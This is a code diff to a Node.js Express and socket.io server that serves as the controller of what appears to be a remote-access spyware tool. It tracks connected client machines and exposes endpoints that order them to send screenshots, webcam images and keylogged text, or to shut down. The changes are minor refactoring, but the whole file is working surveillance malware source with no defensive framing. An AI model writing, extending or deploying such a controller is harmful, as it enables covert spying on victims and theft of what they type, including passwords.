@@ -12,7 +12,7 @@ app.use('/docs', (req, res) => {
     <div style='font-family: arial;padding:100px;width: 800px;'>${markdown.makeHtml(md)}</div>
   </body>`
   res.set('Content-Type', 'text/html');
-  res.send(Buffer.from(html));
+  res.end(Buffer.from(html));
 })
 
 app.use('/dl', express.static('download'))
@@ -25,9 +25,9 @@ const io = new Server(server)
 let socket_infos = []
 
 function getSocketById(id) {
-  
+
   let sockets = io.sockets.sockets
-  
+
   if (sockets.has(id)) {
     return sockets.get(id)
   }
@@ -36,68 +36,65 @@ function getSocketById(id) {
 }
 
 app.use('/sockets', (req, res) => {
-  
+
   res.set('Content-Type', 'application/json');
   let string = JSON.stringify(socket_infos)
-  res.send(Buffer.from(string));
-  
+  res.end(Buffer.from(string));
+
 })
 
 app.get('/do/screenshot/:socketId', (req, res) => {
-  
+
   res.set('Content-Type', 'application/json');
   io.to(req.params.socketId).emit('screen')
   let socket = getSocketById(req.params.socketId)
-  
+
   if (socket === false) { res.status(400); return }
-  
+
   socket.on("image", (buffer) => {
-    res.send(Buffer.from(JSON.stringify({
+    res.end(Buffer.from(JSON.stringify({
       base64: `data:image/png;base64, ${buffer.toString('base64')}`
     })))
-    res.end()
   })
 
 })
 
 app.get('/do/webcam/:socketId', (req, res) => {
-  
+
   res.set('Content-Type', 'application/json');
   io.to(req.params.socketId).emit('cam')
   let socket = getSocketById(req.params.socketId)
-  
+
   if (socket === false) { res.status(400); return }
-  
+
   socket.on("image", (buffer) => {
-    res.send(Buffer.from(JSON.stringify({
+    res.end(Buffer.from(JSON.stringify({
       base64: `data:image/png;base64, ${buffer.toString('base64')}`
     })))
-    res.end()
   })
 
 })
 
 app.get('/do/keylog/:socketId', (req, res) => {
-  
+
   res.set('Content-Type', 'application/json');
   io.to(req.params.socketId).emit('keylog')
   let socket = getSocketById(req.params.socketId)
-  
+
   if (socket === false) { res.status(400); return }
-  
+
   socket.on("out_keylog", (array) => {
-    
-    res.send(Buffer.from(JSON.stringify({
+
+    res.end(Buffer.from(JSON.stringify({
       rawtext: array.filter(x => x.length === 1 || x === "ENTER" || x === "SPACE").join('').replaceAll('SPACE', " ").replaceAll('ENTER', '\n\n').toLowerCase()
     })))
     
-    res.end()
   })
 
 })
 
 app.get('/do/kill/:socketId', (req, res) => {
-  
+
   let socket = getSocketById(req.params.socketId)
   if (socket === false) { res.status(400); return }
   io.to(req.params.socketId).emit('kill')
@@ -105,7 +102,11 @@ app.get('/do/kill/:socketId', (req, res) => {
 })
 
 io.on('connection', socket => {
-  
+
+  if(!socket_infos.find(x => x.id == socket.id)) {
+    io.to(socket.id).emit('info')
+  }
+
   socket.on('socket_info', infos => {
     infos.id = socket.id
     socket_infos.push(infos)
@@ -114,5 +115,5 @@ io.on('connection', socket => {
   socket.on('disconnect', () => {
     socket_infos.splice(socket_infos.indexOf(socket_infos.find(x => x.id == socket.id)), 1)
   })
-  
+
 })
